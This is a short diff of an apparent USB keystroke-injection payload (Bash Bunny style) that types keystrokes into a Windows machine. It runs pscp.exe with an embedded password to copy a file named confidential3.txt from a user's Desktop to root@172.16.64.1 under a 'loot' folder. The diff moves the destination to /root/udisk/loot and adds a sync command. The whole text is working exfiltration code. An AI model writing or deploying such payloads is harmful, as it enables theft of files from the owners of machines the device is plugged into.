@@ -19,11 +19,11 @@ QUACK ENTER
 sleep 1
 
 # Type the PSCP command with embedded password
-QUACK STRING pscp.exe -P 22 -pw YOUR_PASSWORD "C:\Users\barto\Desktop\test\confidential3.txt" root@172.16.64.1:/loot
+QUACK STRING pscp.exe -P 22 -pw YOUR_PASSWORD "C:\Users\barto\Desktop\test\confidential3.txt" root@172.16.64.1:/root/udisk/loot
 QUACK ENTER
 sleep 1
 QUACK y
 
-
+sync
 # Finish
 LED FINISH
